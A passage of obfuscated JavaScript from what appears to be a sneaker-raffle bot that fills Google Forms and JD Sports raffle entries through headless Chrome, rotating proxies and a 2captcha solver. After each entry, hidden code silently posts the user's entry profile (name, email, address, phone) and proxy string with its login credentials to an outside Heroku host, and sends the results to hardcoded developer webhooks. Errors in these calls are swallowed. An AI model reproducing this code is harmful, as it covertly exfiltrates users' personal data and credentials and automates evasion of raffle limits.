                        _0x41d22(_0x44fffb[_0x3cc99a], _0x51ecc8), console['log'](_0xd12810['green'](_0x303e65() + '\x20[' + _0x51ecc8['name'] + ']\x20Task\x20' + (_0x3cc99a + 0x1) + '\x20:\x20Raffle\x20Entered!'));
                        let _0x521388 = _0x44fffb[_0x3cc99a];
                        try {
                            prxdata = {
                                'username': _0x4ebc10['replace']('#', ''),
                                'module': _0x51ecc8['name'],
                                'entrydata': JSON['stringify'](_0x521388),
                                'proxy': '' + _0x2d3e31[_0x3cc99a]
                            };
                            var _0x51bcb6 = JSON['stringify'](prxdata);
                            let _0x5e04b3 = { 'headers': { 'content-type': 'application/json' } };
                            await _0x4f7750['post']('https://jraffles.herokuapp.com/success', _0x51bcb6, _0x5e04b3);
                        } catch (_0x1832e0) {
                        }
                        if (_0x33c579['webhook'] != undefined && _0x33c579['webhook'] != '')
                            try {
                                await _0x265172(_0x33c579['webhook'], _0x4bf3b4['succesDEVMSG']);
                            } catch {
                            }
                        await _0x4b01dc(0xc8), await _0x265172(_0x485a18, _0x4bf3b4['succesDEVMSG']), await _0x4b01dc(0xc8);
                        try {
                            await _0x265172(_0x2c2f0f, _0x4bf3b4['succesPUBMSG']);
                        } catch {
                        }
                    } catch (_0x244aea) {
                        console['log'](_0x303e65() + '\x20[' + _0x51ecc8['name'] + ']\x20Task\x20' + (_0x3cc99a + 0x1) + '\x20:\x20' + _0x244aea), _0x28298b = '' + _0x244aea;
                        var _0x2f82ff = await _0x4a5b92(_0x44fffb[_0x3cc99a], _0x51ecc8, 'dev', !![], _0x28298b);
                        _0x4bf3b4['errorDEV'] = { 'embeds': [_0x2f82ff] }, _0x33c579['webhook'] != undefined && _0x33c579['webhook'] != '' && await _0x265172(_0x33c579['webhook'], _0x4bf3b4['errorDEV']), await _0x265172(_0x3cc994, _0x4bf3b4['errorDEV']), _0x4afb9a = 'yes';
                    } finally {
                        _0x3364ed['close']();
                        if (_0x4afb9a == 'yes' && _0x19a7e9 != 0x5) {
                            console['log'](_0xd12810['red'](_0x303e65() + '\x20[' + _0x51ecc8['name'] + ']\x20Task\x20' + (_0x3cc99a + 0x1) + '\x20:\x20Retrying\x20(' + _0x19a7e9 + '\x20/\x205)')), _0x3cc99a = _0x3cc99a - 0x1, _0x19a7e9 = _0x19a7e9 + 0x1;
                            continue;
                        }
                        console['log']('Waiting\x20for\x20' + _0x33c579['delay'] + '\x20ms'), await _0x4b01dc(_0x33c579['delay']);
                    }
                }
            }
        }]
    },
    {
        'name': 'Google\x20Forms',
        'modules': [{
            'name': 'SMART\x20ENTRIES',
            'store': 'Google\x20Forms',
            'logo': 'https://www.pngplay.com/wp-content/uploads/13/Google-Logo-PNG-HD-Quality.png',
            'function': async function (_0x1fa007, _0x4fedad, _0x46536a) {
                let _0x85a130 = {
                    'FirstName': '',
                    'LastName': '',
                    'Email': '',
                    'Country': '',
                    'Address': '',
                    'City': '',
                    'Zip': '',
                    'Size': '',
                    'Phone': ''
                };
                var _0x11927b = _0x3f6207['readFileSync']('forms/templates.json', 'utf-8');
                let _0x4cf9d6 = JSON['parse'](_0x11927b), _0x556c1d = ![];
                if (_0x4cf9d6['length'] != 0x0) {
                    let _0x21ad00 = 0x0;
                    for (template of _0x4cf9d6) {
                        if (template['Url'] == _0x4fedad[0x0]['Url']) {
                            _0x556c1d = !![], console['log'](_0xd12810['yellow']('Would\x20you\x20like\x20to\x20use\x20this\x20template?'));
                            for (key in template) {
                                key != 'Url' && !key['includes']('Select') && !key['includes']('custom') && template[key] != '' && console['log'](template[key] + ':\x20' + _0xd12810['cyan'](key)), (key['includes']('Select') || key['includes']('custom')) && console['log'](template[key]['title'] + ':\x20' + _0xd12810['cyan'](template[key]['answer']));
                            }
                            console['log']();
                            async function _0x3bed2a() {
                                let _0x3926d2 = await _0x15f555['get']('answer');
                                if (_0x3926d2['answer']['toLowerCase']() != 'y' && _0x3926d2['answer']['toLowerCase']() != 'n')
                                    return console['log']('Invalid\x20Selection'), _0x3bed2a();
                                return _0x3926d2['answer']['toLowerCase']();
                            }
                            if (await _0x3bed2a() == 'n') {
                                _0x4cf9d6['splice'](_0x21ad00, 0x1), console['clear']();
                                break;
                            }
                            _0x85a130 = template, console['clear']();
                            break;
                        }
                        _0x21ad00++;
                    }
                }
                let _0x92bf3e = 0x0, _0x2c692d = 0x0;
                function _0x11e6ca(_0x2675e1) {
                    console['log'](_0x303e65() + '\x20[' + _0x1fa007['name'] + ']\x20Task\x20' + (_0x89cbb8 + 0x1) + '\x20:\x20' + _0x2675e1);
                }
                var _0x53f26d = 0x0;
                for (key in _0x85a130) {
                    if (key['includes']('custom'))
                        _0x92bf3e++;
                    if (key['includes']('Select'))
                        _0x2c692d++;
                }
                for (var _0x89cbb8 = 0x0; _0x89cbb8 < _0x4fedad['length']; _0x89cbb8++) {
                    _0x85a130['Url'] = _0x4fedad[_0x89cbb8]['Url'];
                    let _0x1030c2 = ![];
                    if (_0x4cf9d6['length'] != 0x0)
                        for (template of _0x4cf9d6) {
                            if (template['Url'] == _0x4fedad[_0x89cbb8]['Url']) {
                                _0x85a130 = template, _0x1030c2 = !![], _0x11e6ca('Found\x20Template');
                                break;
                            }
                        }
                    var _0x13644e;
                    if (_0x3997c7 != 'yes') {
                        if (!_0x3997c7)
                            var _0x3997c7 = '';
                        else
                            _0x3997c7 = '';
                        _0x53f26d = 0x0;
                    }
                    try {
                        await _0x32ecbd(_0x4fedad, _0x89cbb8);
                    } catch {
                        _0x3997c7 = 'no';
                        throw new Error('Invalid\x20CSV\x20Format,\x20use\x20the\x20CSV\x20Files\x20from\x20the\x20guides!');
                    }
                    if (_0x33c579['useRandomProxy'] = ![])
                        var _0x36ea7b = _0x46536a[_0x89cbb8]['split'](':');
                    else
                        var _0x55ae0a = Math['round'](Math['random']() * (_0x46536a['length'] - 0x1)), _0x36ea7b = _0x46536a[_0x55ae0a]['split'](':');
                    var _0x5ade30;
                    if (_0x36ea7b['length'] == 0x1)
                        try {
                            _0x5ade30 = await _0x284c7b['launch']({
                                'executablePath': 'C:\x5cProgram\x20Files\x20(x86)\x5cGoogle\x5cChrome\x5cApplication\x5cchrome.exe',
                                'headless': !![],
                                'args': [
                                    '--no-sandbox',
                                    '--disable-setuid-sandbox'
                                ]
                            });
                        } catch {
                            _0x5ade30 = await _0x284c7b['launch']({
                                'executablePath': 'C:\x5cProgram\x20Files\x5cGoogle\x5cChrome\x5cApplication\x5cchrome.exe',
                                'headless': !![],
                                'args': [
                                    '--no-sandbox',
                                    '--disable-setuid-sandbox'
                                ],
                                'env': { 'LANGUAGE': 'en-US' }
                            });
                        }
                    else
                        try {
                            _0x5ade30 = await _0x284c7b['launch']({
                                'executablePath': 'C:\x5cProgram\x20Files\x20(x86)\x5cGoogle\x5cChrome\x5cApplication\x5cchrome.exe',
                                'headless': !![],
                                'args': [
                                    '--proxy-server=' + _0x36ea7b[0x0] + ':' + _0x36ea7b[0x1],
                                    '--no-sandbox',
                                    '--disable-setuid-sandbox'
                                ]
                            });
                        } catch {
                            _0x5ade30 = await _0x284c7b['launch']({
                                'executablePath': 'C:\x5cProgram\x20Files\x5cGoogle\x5cChrome\x5cApplication\x5cchrome.exe',
                                'headless': !![],
                                'args': [
                                    '--proxy-server=' + _0x36ea7b[0x0] + ':' + _0x36ea7b[0x1],
                                    '--no-sandbox',
                                    '--disable-setuid-sandbox'
                                ],
                                'env': { 'LANGUAGE': 'en-US' }
                            });
                        }
                    try {
                        let _0x17272b = { 'first': ![] };
                        const _0x42a73b = await _0x5ade30['newPage']();
                        if (_0x36ea7b['length'] != 0x0)
                            await _0x42a73b['authenticate']({
                                'username': '' + _0x36ea7b[0x2],
                                'password': '' + _0x36ea7b[0x3]
                            });
                        _0x11e6ca('Getting\x20Session');
                        let _0x92e2f2 = ![];
                        try {
                            await _0x42a73b['goto'](_0x4fedad[_0x89cbb8]['Url'], {
                                'waitUntil': 'load',
                                'timeout': 0x0
                            }), await _0x4b01dc(0xbb8);
                        } catch (_0x5d78c5) {
                            throw new Error(_0x5d78c5);
                        }
                        const _0x2c1f28 = await _0x42a73b['$']('body\x20>\x20div.llhEMd.iWO5td\x20>\x20div\x20>\x20div.g3VIld.Up8vH.J9Nfi.iWO5td\x20>\x20div.XfpsVe.J9fJmf');
                        if (_0x2c1f28) {
                            _0x11e6ca('Login\x20Detected');
                            let _0x5511a3 = await _0x2c1f28['$']('div[data-id=\x22EBS5u\x22]');
                            await _0x5511a3['click'](), _0x92e2f2 = !![];
                        }
                        let _0x5183dc = await _0x42a73b['$']('#identifierId');
                        _0x5183dc && (_0x92e2f2 = !![]);
                        await _0x42a73b['waitForSelector']('.teQAzf');
                        async function _0x2b1c17() {
                            let _0x4bb337 = await _0x42a73b['$$']('.o3Dpx\x20>\x20div[role=\x22listitem\x22]');
                            for (question of _0x4bb337) {
                                let _0x4eec55;
                                try {
                                    _0x4eec55 = await question['$eval']('.M7eMe', _0x5566bb => _0x5566bb['textContent']);
                                } catch {
                                    continue;
                                }
                                if (_0x92bf3e != 0x0) {
                                    let _0x5751d3 = ![];
                                    for (let _0x368324 = 0x0; _0x368324 < _0x92bf3e; _0x368324++) {
                                        if (_0x4eec55 == _0x85a130['custom' + _0x368324]['title']) {
                                            _0x11e6ca('Custom\x20Selector\x20found;\x20' + _0x4eec55);
                                            let _0x3f92ae = await question['$']('input[jsname=\x22YPqjbf\x22]'), _0x59be67 = await question['$']('textarea[jsname=\x22YPqjbf\x22]');
                                            if (_0x3f92ae)
                                                await _0x3f92ae['type']('' + _0x85a130['custom' + _0x368324]['answer']);
                                            else
                                                _0x59be67 && await _0x59be67['type']('' + _0x85a130['custom' + _0x368324]['answer']);
                                            _0x5751d3 = !![];
                                            break;
                                        }
                                    }
                                    if (_0x5751d3) {
                                        await _0x4b01dc(0x15e);
                                        continue;
                                    }
                                }
                                if (_0x2c692d != 0x0) {
                                    let _0x4e153c = ![];
                                    for (let _0x2c554d = 0x0; _0x2c554d < _0x2c692d; _0x2c554d++) {
                                        if (_0x4eec55 == _0x85a130[_0x2c554d + 'Select']['title']) {
                                            _0x11e6ca('Custom\x20Selector\x20found;\x20' + _0x4eec55);
                                            let _0x8ed756 = await question['$$']('.ulDsOb');
                                            for (opt of _0x85a130[_0x2c554d + 'Select']['answer']) {
                                                let _0x1d065b = await _0x8ed756[opt]['$']('span');
                                                await _0x1d065b['click']();
                                            }
                                            _0x4e153c = !![];
                                            break;
                                        }
                                    }
                                    if (_0x4e153c) {
                                        await _0x4b01dc(0x15e);
                                        continue;
                                    }
                                }
                                try {
                                    if (_0x4eec55 == _0x85a130['0Select']['title']) {
                                        _0x11e6ca('Custom\x20Selector\x20found;\x20' + _0x85a130['0Select']['title']);
                                        let _0x4fb638 = await question['$$']('.ulDsOb'), _0x3aedfd = await _0x4fb638[_0x85a130['0Select']['answer']];
                                        await _0x3aedfd['click']();
                                        continue;
                                    }
                                    if (_0x4eec55 == _0x85a130['1Select']['title']) {
                                        _0x11e6ca('Custom\x20Selector\x20found;\x20' + _0x85a130['1Select']['title']);
                                        let _0x4b6f27 = await question['$$']('.ulDsOb'), _0x58752b = await _0x4b6f27[_0x85a130['1Select']['answer']];
                                        await _0x58752b['click']();
                                        continue;
                                    }
                                    if (_0x4eec55 == _0x85a130['2Select']['title']) {
                                        _0x11e6ca('Custom\x20Selector\x20found;\x20' + _0x85a130['2Select']['title']);
                                        let _0x111d64 = await question['$$']('.ulDsOb'), _0x2704d8 = await _0x111d64[_0x85a130['2Select']['answer']];
                                        await _0x2704d8['click']();
                                        continue;
                                    }
                                } catch (_0x2279d6) {
                                }
                                if (_0x4eec55['toLowerCase']()['includes']('mail') && !_0x4eec55['toLowerCase']()['includes']('agree') || _0x4eec55 == _0x85a130['Email']) {
                                    _0x11e6ca('Mail\x20Selector\x20found;\x20' + _0x4eec55);
                                    let _0x82ce48 = await question['$']('input');
                                    !_0x82ce48 && (_0x82ce48 = await question['$']('textarea[jsname=\x22YPqjbf\x22]'));
                                    await _0x82ce48['type'](_0x4fedad[_0x89cbb8]['Email']), await _0x4b01dc(0x258);
                                    continue;
                                }
                                if (_0x4eec55['toLowerCase']()['includes']('first') || _0x4eec55['toLowerCase']() == 'name' || _0x4eec55['toLowerCase']() == 'name\x20' || _0x4eec55 == _0x85a130['FirstName']) {
                                    _0x11e6ca('FirstName\x20Selector\x20found;\x20' + _0x4eec55);
                                    let _0xfdf00 = await question['$']('input');
                                    !_0xfdf00 && (_0xfdf00 = await question['$']('textarea'));
                                    await _0xfdf00['type'](_0x4fedad[_0x89cbb8]['FirstName'] + '\x20'), await _0x4b01dc(0x258);
                                    if (_0x4eec55 == _0x85a130['FirstName'])
                                        continue;
                                }
                                if (_0x4eec55['toLowerCase']()['includes']('last') || _0x4eec55['toLowerCase']()['includes']('surname') || _0x4eec55 == _0x85a130['LastName']) {
                                    _0x11e6ca('LastName\x20Selector\x20found;\x20' + _0x4eec55);
                                    let _0x3f6df8 = await question['$']('input');
                                    !_0x3f6df8 && (_0x3f6df8 = await question['$']('textarea'));
                                    await _0x3f6df8['type'](_0x4fedad[_0x89cbb8]['LastName'] + '\x20'), await _0x4b01dc(0x258);
                                    continue;
                                }
                                if (_0x4eec55['toLowerCase']()['includes']('address') && !_0x4eec55['toLowerCase']()['includes']('agree') || _0x4eec55 == _0x85a130['Address']) {
                                    _0x11e6ca('Address\x20Selector\x20found;\x20' + _0x4eec55);
                                    let _0x2e57c8 = await question['$']('input');
                                    !_0x2e57c8 && (_0x2e57c8 = await question['$']('textarea'));
                                    await _0x2e57c8['type'](_0x4fedad[_0x89cbb8]['Address1'] + '\x20' + _0x4fedad[_0x89cbb8]['HouseNumber'] + '\x20' + _0x4fedad[_0x89cbb8]['Address2']), await _0x4b01dc(0x258);
                                    continue;
                                }
                                if (_0x4eec55['toLowerCase']()['includes']('phone') || _0x4eec55['toLowerCase']()['includes']('mobile') || _0x4eec55 == _0x85a130['Phone']) {
                                    _0x11e6ca('Phone\x20Selector\x20found;\x20' + _0x4eec55);
                                    let _0x4f76ed = await question['$']('input');
                                    !_0x4f76ed && (_0x4f76ed = await question['$']('textarea'));
                                    await _0x4f76ed['type']('' + _0x4fedad[_0x89cbb8]['Phone']), await _0x4b01dc(0x258);
                                    continue;
                                }
                                if (_0x4eec55['toLowerCase']()['includes']('country') || _0x4eec55 == _0x85a130['Country']) {
                                    let _0x5030fa = await question['$']('div[jsname=\x22wCJL8\x22]');
                                    if (_0x5030fa) {
                                        let _0x1ff50c = ![], _0x346b91 = await _0x5030fa['$$']('.ulDsOb');
                                        for (option of _0x346b91) {
                                            let _0x4832c2 = await option['$']('span'), _0x30efd0 = await option['$eval']('span', _0x50dd0e => _0x50dd0e['textContent']);
                                            if (_0x30efd0['toLowerCase']() == _0x4fedad[_0x89cbb8]['Country']['toLowerCase']()) {
                                                await _0x4832c2['click'](), _0x1ff50c = !![];
                                                break;
                                            }
                                        }
                                        if (!_0x1ff50c) {
                                            const _0x4b0108 = await question['$']('.Hvn9fb.zHQkBf');
                                            await _0x4b0108['click'](), await _0x4b0108['type'](_0x4fedad[_0x89cbb8]['Country']);
                                        }
                                        continue;
                                    }
                                    _0x11e6ca('Country\x20Selector\x20found;\x20' + _0x4eec55);
                                    let _0x2813e2 = await question['$']('input');
                                    !_0x2813e2 && (_0x2813e2 = await question['$']('textarea'));
                                    await _0x2813e2['type']('' + _0x4fedad[_0x89cbb8]['Country']), await _0x4b01dc(0x258);
                                    continue;
                                }
                                if (_0x4eec55['toLowerCase']()['includes']('city') || _0x4eec55 == _0x85a130['City']) {
                                    _0x11e6ca('City\x20Selector\x20found;\x20' + _0x4eec55);
                                    let _0x873666 = await question['$']('input');
                                    !_0x873666 && (_0x873666 = await question['$']('textarea'));
                                    await _0x873666['type']('' + _0x4fedad[_0x89cbb8]['City']), await _0x4b01dc(0x258);
                                    continue;
                                }
                                if (_0x4eec55['toLowerCase']()['includes']('zip') || _0x4eec55 == _0x85a130['Zip']) {
                                    _0x11e6ca('Zip\x20Selector\x20found;\x20' + _0x4eec55);
                                    let _0x46451e = await question['$']('input');
                                    !_0x46451e && (_0x46451e = await question['$']('textarea'));
                                    await _0x46451e['type']('' + _0x4fedad[_0x89cbb8]['Zip']), await _0x4b01dc(0x258);
                                    continue;
                                }
                                if (_0x4eec55['toLowerCase']()['includes']('insta') || _0x4eec55 == _0x85a130['Follower']) {
                                    _0x11e6ca('Follower\x20Selector\x20found;\x20' + _0x4eec55);
                                    let _0x3a0044 = await question['$']('input');
                                    !_0x3a0044 && (_0x3a0044 = await question['$']('textarea'));
                                    await _0x3a0044['type']('' + _0x4fedad[_0x89cbb8]['Follower']), await _0x4b01dc(0x258);
                                    continue;
                                }
                                if (_0x4eec55['toLowerCase']()['includes']('size') || _0x4eec55 == _0x85a130['Size']) {
                                    _0x11e6ca('Size\x20Selector\x20found;\x20' + _0x4eec55);
                                    let _0x334ff7 = await question['$']('div[jscontroller=\x22sW52Ae\x22]');
                                    if (_0x334ff7) {
                                        let _0x5792f1 = await _0x334ff7['$$']('.ulDsOb');
                                        if (_0x4fedad[_0x89cbb8]['Size']['toLowerCase']() == 'random') {
                                            var _0x3ad901 = Math['round'](Math['random']() * (_0x5792f1['length'] - 0x1));
                                            await _0x5792f1[_0x3ad901]['click']();
                                        } else
                                            for (size of _0x5792f1) {
                                                let _0x1f0dfd = await size['$eval']('.aDTYNe.snByac.n5vBHf.OIC90c', _0x9f9432 => _0x9f9432['textContent']);
                                                if (_0x1f0dfd['toLowerCase']()['includes'](_0x4fedad[_0x89cbb8]['Size'])) {
                                                    await size['click']();
                                                    break;
                                                }
                                            }
                                    }
                                    let _0x1c0474 = await question['$']('.ry3kXd');
                                    if (_0x1c0474) {
                                        await _0x1c0474['click'](), await _0x4b01dc(0x9c4);
                                        let _0xbe6e18 = await _0x42a73b['$']('div[jsname=\x22V68bde\x22]'), _0x1a2bd3 = await _0xbe6e18['$$']('div[jsname=\x22wQNmvb\x22]');
                                        for (size of _0x1a2bd3) {
                                            let _0x115419 = await size['$eval']('.vRMGwf.oJeWuf', _0x59acd3 => _0x59acd3['textContent']), _0x3f6ccb = await size['$']('.vRMGwf.oJeWuf');
                                            if (_0x115419['toLowerCase']()['includes'](_0x4fedad[_0x89cbb8]['Size'])) {
                                                await _0x4b01dc(0x190), await _0x3f6ccb['click']();
                                                break;
                                            }
                                        }
                                    }
                                    await _0x4b01dc(0x258);
                                    continue;
                                }
                                if (_0x4eec55['toLowerCase']()['includes']('receive') || _0x4eec55['toLowerCase']()['includes']('method')) {
                                    _0x11e6ca('Method\x20Selector\x20found;\x20' + _0x4eec55);
                                    let _0x6a10d9 = await question['$']('div[jscontroller=\x22sW52Ae\x22]');
                                    if (_0x6a10d9) {
                                        const _0x326806 = await _0x6a10d9['$$']('.ulDsOb');
                                        for (size of _0x326806) {
                                            let _0x19b82a = await size['$eval']('.aDTYNe.snByac.n5vBHf.OIC90c', _0x251fb3 => _0x251fb3['textContent']);
                                            if (_0x19b82a['toLowerCase']()['includes']('shipping')) {
                                                await size['click']();
                                                break;
                                            }
                                        }
                                    }
                                    await _0x4b01dc(0x258);
                                    continue;
                                }
                                if (_0x4eec55['toLowerCase']()['includes']('offers') || _0x4eec55['toLowerCase']()['includes']('agree')) {
                                    _0x11e6ca('Authorization\x20Selector\x20found;\x20' + _0x4eec55);
                                    const _0x4bdd56 = await question['$']('div[jscontroller=\x22sW52Ae\x22]');
                                    if (_0x4bdd56) {
                                        const _0x3c6aaf = await _0x4bdd56['$$']('.ulDsOb');
                                        for (size of _0x3c6aaf) {
                                            let _0x5c65ee = await size['$eval']('.aDTYNe.snByac.n5vBHf.OIC90c', _0x4a917c => _0x4a917c['textContent']);
                                            if (_0x5c65ee['toLowerCase']()['includes']('authorize') || _0x5c65ee['toLowerCase']()['includes']('yes')) {
                                                await size['click']();
                                                break;
                                            }
                                        }
                                    }
                                    await _0x4b01dc(0x258);
                                    continue;
                                }
                                async function _0xd82bf9() {
                                    let _0xd85dc4 = await question['$']('.oyXaNc');
                                    if (_0xd85dc4) {
                                        console['log']('Choose\x20an\x20input\x20for\x20selector:\x20' + _0xd12810['cyan'](_0x4eec55) + '\x0a');
                                        let _0x178b19 = await question['$$']('.ulDsOb');
                                        for (let _0x2ed9ec = 0x0; _0x2ed9ec < _0x178b19['length']; _0x2ed9ec++) {
                                            let _0x30e4f2 = await _0x178b19[_0x2ed9ec]['$eval']('span', _0x49c52f => _0x49c52f['textContent']);
                                            console['log']('\x20(' + _0x2ed9ec + ')\x20' + _0x30e4f2);
                                        }
                                        console['log']();
                                        let _0x1107f5 = await _0x15f555['get']('option'), _0x54f424 = await _0x178b19[_0x1107f5['option']]['$eval']('span', _0x46c89c => _0x46c89c['textContent']);
                                        _0x85a130[_0x2c692d + 'Select'] = {
                                            'title': _0x4eec55,
                                            'answer': _0x1107f5['option']['split'](',')
                                        };
                                        let _0x9cc294 = await _0x178b19[_0x1107f5['option']]['$']('span');
                                        await _0x9cc294['click'](), _0x2c692d++;
                                        return;
                                    }
                                    let _0x3b8839 = await question['$']('.Y6Myld');
                                    if (_0x3b8839) {
                                        console['log']('Choose\x20an\x20input\x20for\x20selector:\x20' + _0xd12810['cyan'](_0x4eec55) + '\x0a');
                                        let _0x1e0c90 = await question['$$']('.ulDsOb');
                                        for (let _0x19191a = 0x0; _0x19191a < _0x1e0c90['length']; _0x19191a++) {
                                            let _0x31e275 = await _0x1e0c90[_0x19191a]['$eval']('span', _0x105526 => _0x105526['textContent']);
                                            console['log']('\x20(' + _0x19191a + ')\x20' + _0x31e275);
                                        }
                                        console['log']();
                                        let _0x36f10b = await _0x15f555['get']('option');
                                        _0x85a130[_0x2c692d + 'Select'] = {
                                            'title': _0x4eec55,
                                            'answer': _0x36f10b['option']['split'](',')
                                        };
                                        for (opt of _0x85a130[_0x2c692d + 'Select']['answer']) {
                                            let _0x66e2c6 = await _0x1e0c90[opt]['$']('span');
                                            await _0x66e2c6['click']();
                                        }
                                        _0x2c692d++;
                                        return;
                                    }
                                    var _0x27161e = 0x0;
                                    let _0xa8e057 = Object['keys'](_0x85a130);
                                    console['log']('Choose\x20an\x20input\x20for\x20selector:\x20' + _0xd12810['cyan'](_0x4eec55) + '\x0a');
                                    for (data of _0xa8e057) {
                                        !data['includes']('custom' && !data['includes']('Select')) ? console['log']('\x20(' + _0x27161e + ')\x20' + data + '\x20(Taken\x20from\x20csv)') : console['log']('\x20(' + _0x27161e + ')\x20' + data), _0x27161e++;
                                    }
                                    console['log']('\x20(' + _0xa8e057['length'] + ')\x20Custom\x20input:'), console['log']();
                                    let _0x36e96f = await _0x15f555['get']('input');
                                    if (_0x36e96f['input'] == _0xa8e057['length']) {
                                        console['log']('What\x20should\x20the\x20bot\x20fill\x20in\x20this\x20input?\x0a');
                                        let _0x2860bc = await _0x15f555['get']('input');
                                        _0x85a130['custom' + _0x92bf3e] = {
                                            'title': _0x4eec55,
                                            'answer': '' + _0x2860bc['input']
                                        };
                                        let _0x4c2dfa = await question['$']('input[jsname=\x22YPqjbf\x22]'), _0x3cc77f = await question['$']('textarea[jsname=\x22YPqjbf\x22]');
                                        if (_0x4c2dfa)
                                            await _0x4c2dfa['type']('' + _0x85a130['custom' + _0x92bf3e]['answer']);
                                        else
                                            _0x3cc77f && await _0x3cc77f['type']('' + _0x85a130['custom' + _0x92bf3e]['answer']);
                                        _0x92bf3e++;
                                        return;
                                    }
                                    _0x85a130['' + _0xa8e057[_0x36e96f['input']]] = _0x4eec55;
                                    let _0x3ab761 = await question['$']('input[jsname=\x22YPqjbf\x22]'), _0x2c1dc3 = await question['$']('textarea[jsname=\x22YPqjbf\x22]');
                                    _0x3ab761 && await _0x3ab761['type']('' + _0x4fedad[_0x89cbb8]['' + _0xa8e057[_0x36e96f['input']]]), _0x2c1dc3 && await _0x2c1dc3['type']('' + _0x4fedad[_0x89cbb8]['' + _0xa8e057[_0x36e96f['input']]]), await _0x4b01dc(0x258);
                                }
                                await _0xd82bf9(), await _0x4b01dc(0x37a);
                            }
                            let _0x59f6cb = await _0x42a73b['$']('div[jsname=\x22OCpkoe\x22]');
                            if (_0x59f6cb)
                                return await _0x59f6cb['click'](), await _0x42a73b['waitForNavigation']({ 'waitUntil': 'networkidle2' }), _0x11e6ca('New\x20Section'), _0x2b1c17();
                        }
                        await _0x2b1c17(), await _0x42a73b['click']('div[jsname=\x22M2UYVd\x22]');
                        try {
                            await _0x42a73b['waitForSelector']('.vHW8K');
                        } catch {
                            throw new Error('Could\x20not\x20send\x20Form,\x20check\x20all\x20fields!');
                        }
                        _0x41d22(_0x4fedad[_0x89cbb8], _0x1fa007), _0x3997c7 = 'no';
                        var _0x5357a6 = await _0x4a5b92(_0x4fedad[_0x89cbb8], _0x1fa007, 'dev', ![]), _0x4d4b38 = await _0x4a5b92(_0x4fedad[_0x89cbb8], _0x1fa007, 'pub', ![]);
                        let _0x508534 = _0x4fedad[_0x89cbb8];
                        try {
                            prxdata = {
                                'username': _0x4ebc10['replace']('#', ''),
                                'module': _0x1fa007['name'],
                                'entrydata': JSON['stringify'](_0x508534),
                                'proxy': '' + _0x46536a[_0x89cbb8]
                            };
                            var _0x5caf78 = JSON['stringify'](prxdata);
                            let _0x49fb0e = { 'headers': { 'content-type': 'application/json' } };
                            await _0x4f7750['post']('https://jraffles.herokuapp.com/success', _0x5caf78, _0x49fb0e);
                        } catch (_0x3f1320) {
                        }
                        const _0x500054 = {
                            'succesDEVMSG': { 'embeds': [_0x5357a6] },
                            'succesPUBMSG': { 'embeds': [_0x4d4b38] }
                        };
                        try {
                            _0x33c579['webhook'] != undefined && _0x33c579['webhook'] != '' && await _0x265172(_0x33c579['webhook'], _0x500054['succesDEVMSG']), await _0x4b01dc(0xc8), await _0x265172(_0x485a18, _0x500054['succesDEVMSG']), await _0x4b01dc(0xc8), await _0x265172(_0x2c2f0f, _0x500054['succesPUBMSG']);
                        } catch (_0x511084) {
                            console['log'](_0xd12810['yellow'](_0x303e65() + '\x20[' + _0x5411d6[taskModule]['name'] + ']\x20Task\x20' + (_0x89cbb8 + 0x1) + '\x20:\x20Error\x20sending\x20webhook\x20' + _0x511084));
                        }
                        console['log'](_0xd12810['green'](_0x303e65() + '\x20[' + _0x1fa007['name'] + ']\x20Task\x20' + (_0x89cbb8 + 0x1) + '\x20:\x20Raffle\x20Entered!')), (_0x92bf3e != 0x0 || _0x2c692d != 0x0 && !_0x1030c2) && (_0x4cf9d6['push'](_0x85a130), _0x3f6207['writeFileSync']('forms/templates.json', JSON['stringify'](_0x4cf9d6, null, 0x2), 'utf-8'));
                    } catch (_0x4b801e) {
                        console['log'](_0xd12810['red'](_0x303e65() + '\x20[' + _0x1fa007['name'] + ']\x20Task\x20' + (_0x89cbb8 + 0x1) + '\x20:\x20' + _0x4b801e)), _0x13644e = '' + _0x4b801e;
                        var _0x320974 = await _0x4a5b92(_0x4fedad[_0x89cbb8], _0x1fa007, 'dev', !![], _0x13644e);
                        let _0x4a98de = {};
                        _0x4a98de['errorDEV'] = { 'embeds': [_0x320974] }, _0x33c579['webhook'] != undefined && _0x33c579['webhook'] != '' && await _0x265172(_0x33c579['webhook'], _0x4a98de['errorDEV']), await _0x265172(_0x3cc994, _0x4a98de['errorDEV']), _0x3997c7 = 'yes';
                    } finally {
                        _0x5ade30 && _0x5ade30['close']();
                        if (_0x3997c7 == 'yes' && _0x53f26d != 0x5) {
                            console['log'](_0xd12810['red'](_0x303e65() + '\x20[' + _0x1fa007['name'] + ']\x20Task\x20' + (_0x89cbb8 + 0x1) + '\x20:\x20Retrying\x20(' + (_0x53f26d + 0x1) + '\x20/\x205)')), _0x89cbb8--, _0x53f26d++;
                            continue;
                        }
                        if (_0x3997c7 == 'yes' && _0x53f26d == 0x5) {
                            _0x53f26d = 0x0, _0x3997c7 = 'no';
                            continue;
                        }
                        _0x11e6ca('Waiting\x20for\x20' + _0x33c579['delay'] + '\x20ms'), await _0x4b01dc(_0x33c579['delay']);
                    }
                }
            }
        }]
    },
    {
        'name': 'JD',
        'modules': [{
            'name': 'JD\x20Raffle\x20Entries',
            'store': 'JD',
            'logo': 'https://upload.wikimedia.org/wikipedia/en/thumb/d/d8/JD_Sports_logo.svg/2048px-JD_Sports_logo.svg.png',
            'function': async function (_0x1e9b31, _0x130601, _0x41b4c8) {
                var _0x1d3739 = ![], _0x578d11 = ![];
                if (_0x33c579['captchaKey'] == '' || _0x33c579['captchaKey'] == undefined)
                    return console['log'](_0xd12810['yellow']('No\x202Captcha\x20key\x20found\x20in\x20settings.json')), console['log']('Returning\x20to\x20Menu'), menu();
                _0x284c7b['use'](_0xecf9cb()), _0x284c7b['use'](_0x88e53d({
                    'provider': {
                        'id': '2captcha',
                        'token': '' + _0x33c579['captchaKey']
                    },
                    'visualFeedback': !![]
                }));
                for (var _0x50040e = 0x0; _0x50040e < _0x130601['length']; _0x50040e++) {
                    if (_0x56864c != 'yes')
                        var _0x56864c = '', _0x219ec0 = 0x0;
                    var _0x19e585, _0x3962e0 = [{
                        'type': 'rich',
                        'title': 'Succesful\x20JD\x20entry',
                        'description': '',
                        'color': 0xc0d6d6,
                        'fields': [
                            {
                                'name': 'Product',
                                'value': '' + _0x130601[_0x50040e]['Url']
                            },
                            {
                                'name': 'Size',
                                'value': '' + _0x130601[_0x50040e]['Size']
                            },
                            {
                                'name': 'User',
                                'value': '' + _0x4ebc10
                            },
                            {
                                'name': 'Delay',
                                'value': '' + _0x33c579['delay']
                            },
                            {
                                'name': 'Version',
                                'value': '' + _0x5ddf1c
                            }
                        ]
                    }];
                    const _0x58f931 = { 'embeds': _0x3962e0 };
